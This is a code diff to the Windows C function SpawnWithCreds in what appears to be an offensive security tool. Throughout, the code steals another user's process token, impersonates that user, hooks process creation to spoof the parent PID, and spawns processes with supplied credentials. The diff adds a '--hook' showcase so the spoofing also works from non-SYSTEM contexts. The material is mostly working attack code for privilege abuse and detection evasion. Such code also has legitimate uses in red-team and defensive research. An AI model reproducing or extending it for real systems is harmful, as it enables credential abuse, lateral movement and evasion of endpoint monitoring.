@@ -9,6 +9,8 @@
 // SpawnWithCreds
 //
 // Non-SYSTEM path : direct CreateProcessWithLogonW (goes through seclogon)
+//                   if useHook=TRUE -> installs hook first to showcase the
+//                   mechanism works from normal user context too
 //
 // SYSTEM path     : steal -t user token -> impersonate -> hook -> CPWLW
 //
@@ -33,32 +35,23 @@
 //   stealTarget : username of process to steal token from for impersonation (-t)
 //   ppidName    : preferred parent process name for PPID spoof (NULL = use stolen PID)
 //   sleepMs     : sleep before CPWLW call (debugger attach window, 0 = no sleep)
+//   useHook     : force hook even from non-SYSTEM context (--hook flag showcase)
 // -----------------------------------------------------------------------------
 static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
                            LPCSTR password, LPCSTR cmdline,
                            LPCSTR stealTarget, LPCSTR ppidName,
-                           DWORD sleepMs) {
-
-    // DBG_SEPARATOR();
-    // DBG_INFO("SpawnWithCreds -> %s\\%s  cmd: %s", domain, user, cmdline);
-    // DBG_SEPARATOR();
+                           DWORD sleepMs, BOOL useHook) {
 
     PROCESS_INFORMATION pi = {0};
     BOOL result = FALSE;
 
     // -------------------------------------------------------------------------
     // not SYSTEM -> direct CreateProcessWithLogonW
+    //   if --hook is set: install hook first to showcase the mechanism works
+    //   from a normal user context (our own PID is user-owned so no issues)
     // -------------------------------------------------------------------------
     if (!_IsSystem()) {
         DBG_INFO("non-SYSTEM -> CreateProcessWithLogonW");
-        // DBG_SEPARATOR();
-
-        // HANDLE hSelf = NULL;
-        // if (OpenProcessToken(GetCurrentProcess(),
-        //                      TOKEN_QUERY|TOKEN_QUERY_SOURCE, &hSelf)) {
-        //     DumpTokenInfo(hSelf, "[1] caller token");
-        //     CloseHandle(hSelf);
-        // }
 
         WCHAR wUser[256]={0}, wDomain[256]={0}, wPass[256]={0}, wCmd[512]={0};
         MultiByteToWideChar(CP_ACP,0,user,    -1,wUser,  256);
@@ -70,23 +63,52 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
         si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_SHOW;
 
+        BOOL hookOk = FALSE;
+        if (useHook) {
+            // use our own PID as spoofPid -> we are user-owned, always works
+            // optionally prefer --ppid process owned by current user
+            DWORD spoofPid = 0;
+            char  curUser[256] = {0};
+            DWORD curLen = sizeof(curUser);
+            GetUserNameA(curUser, &curLen);
+
+            if (ppidName && ppidName[0]) {
+                DBG_INFO("[hook] preferred parent: %s owned by %s", ppidName, curUser);
+                spoofPid = FindProcessByUser(curUser, ppidName);
+            }
+            if (!spoofPid) {
+                spoofPid = GetCurrentProcessId();
+                DBG_INFO("[hook] using own PID %lu as spoofPid", spoofPid);
+            }
+
+            DBG_INFO("[hook] installing hook (non-SYSTEM showcase)...");
+            hookOk = HookInstall(spoofPid);
+            if (!hookOk)
+                DBG_WARN("[hook] HookInstall failed");
+            else
+                DBG_OK("[hook] hook installed spoofPid=%lu", spoofPid);
+        }
+
+        if (sleepMs > 0) {
+            DBG_WARN(">>> SLEEPING %lums -> PID=%lu <<<", sleepMs, GetCurrentProcessId());
+            DBG_WARN(">>> bp ADVAPI32!CreateProcessWithLogonCommonW+768 <<<");
+            Sleep(sleepMs);
+            DBG_INFO(">>> sleep done, calling now <<<");
+        }
+
         DBG_INFO("Calling CreateProcessWithLogonW...");
         result = CreateProcessWithLogonW(wUser, wDomain, wPass,
                      LOGON_WITH_PROFILE, NULL, wCmd,
                      CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+        DWORD lastErr = GetLastError();
+
+        if (hookOk) { HookRemove(); }
+
         if (!result) {
-            DBG_ERR("CreateProcessWithLogonW failed: 0x%08lX", GetLastError());
+            DBG_ERR("CreateProcessWithLogonW failed: 0x%08lX", lastErr);
             return FALSE;
         }
         DBG_OK("process spawned PID %lu", pi.dwProcessId);
-        WaitForSingleObject(pi.hProcess, 500);
-        // token info no need for it just extensive debug
-        // HANDLE hChild = NULL;
-        // if (OpenProcessToken(pi.hProcess, TOKEN_QUERY|TOKEN_QUERY_SOURCE, &hChild)) {
-        //     DumpTokenInfo(hChild, "spawned token (seclogon)");
-        //     CloseHandle(hChild);
-        // }
-        WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
         return TRUE;
     }
@@ -95,21 +117,12 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
     // SYSTEM -> steal token -> impersonate -> hook -> CPWLW
     // -------------------------------------------------------------------------
     DBG_INFO("SYSTEM -> steal token -> impersonate -> hook -> CreateProcessWithLogonW");
-    // DBG_SEPARATOR();
 
     if (!stealTarget || !stealTarget[0]) {
         DBG_ERR("requires -t <target_user>");
         return FALSE;
     }
 
-    // dump SYSTEM token
-    // HANDLE hSelf = NULL;
-    // if (OpenProcessToken(GetCurrentProcess(),
-    //                      TOKEN_QUERY|TOKEN_QUERY_SOURCE, &hSelf)) {
-    //     DumpTokenInfo(hSelf, "SYSTEM token (before downgrade)");
-    //      CloseHandle(hSelf);
-    // }
-    //
     // steal token from -t target
     // stolenPid is guaranteed user-owned -> used as fallback spoofPid
     DBG_INFO("stealing token from %s...", stealTarget);
@@ -118,8 +131,6 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
     HANDLE hStolen   = StealToken(&t, &stolenPid);
     if (!hStolen) { DBG_ERR("StealToken failed"); return FALSE; }
     DBG_OK("stolen from PID %lu", stolenPid);
-    // token info
-    // DumpTokenInfo(hStolen, "stolen token from -t target");
 
     // duplicate to impersonation token
     HANDLE hImp = NULL;
@@ -129,7 +140,6 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
         CloseHandle(hStolen); return FALSE;
     }
     CloseHandle(hStolen);
-    // DumpTokenInfo(hImp, "Duplicated impersonation token");
 
     // impersonate -> thread runs as stealTarget, process still SYSTEM
     if (!ImpersonateLoggedOnUser(hImp)) {
@@ -137,13 +147,6 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
         CloseHandle(hImp); return FALSE;
     }
     DBG_OK("Impersonating %s", stealTarget);
-
-    // HANDLE hThrTok = NULL;
-    // if (OpenThreadToken(GetCurrentThread(),
-    //                     TOKEN_QUERY|TOKEN_QUERY_SOURCE, FALSE, &hThrTok)) {
-    //     DumpTokenInfo(hThrTok, "Thread token (proves downgrade)");
-    //     CloseHandle(hThrTok);
-    // }
 
     // find spoofPid
     // priority: --ppid filter -> fallback to stolenPid
@@ -153,7 +156,8 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
         DBG_INFO("Preferred parent: %s owned by %s", ppidName, stealTarget);
         spoofPid = FindProcessByUser(stealTarget, ppidName);
         if (!spoofPid) {
-            DBG_WARN("%s not found for %s -> fallback stolenPid %lu", ppidName, stealTarget, stolenPid);
+            DBG_WARN("%s not found for %s -> fallback stolenPid %lu",
+                     ppidName, stealTarget, stolenPid);
             spoofPid = stolenPid;
         }
     } else {
@@ -173,8 +177,6 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
     BOOL hookOk = HookInstall(spoofPid);
     if (!hookOk)
         DBG_WARN("HookInstall failed -> expect 0x5");
-    // else
-    //     DBG_OK("hook installed");
 
     // optional sleep for debugger attach
     if (sleepMs > 0) {
@@ -202,8 +204,7 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
                  CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
     DWORD lastErr = GetLastError();
 
-    // remove hook immediately
-    if (hookOk) { HookRemove();}
+    if (hookOk) { HookRemove(); }
 
     // revert to SYSTEM
     RevertToSelf();
@@ -216,17 +217,6 @@ static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
     }
     DBG_OK("Process spawned PID %lu (spoofed parent=%lu)", pi.dwProcessId, spoofPid);
 
-    // dump child token
-    // WaitForSingleObject(pi.hProcess, 500);
-    // HANDLE hChild = NULL;
-    // if (OpenProcessToken(pi.hProcess, TOKEN_QUERY|TOKEN_QUERY_SOURCE, &hChild)) {
-    //     DumpTokenInfo(hChild, "Spawned process token");
-    //     CloseHandle(hChild);
-    // } else {
-    //     DBG_WARN("Could not open child token: 0x%08lX", GetLastError());
-    // }
-    //
-    // WaitForSingleObject(pi.hProcess, INFINITE);
     CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
     return TRUE;
 }
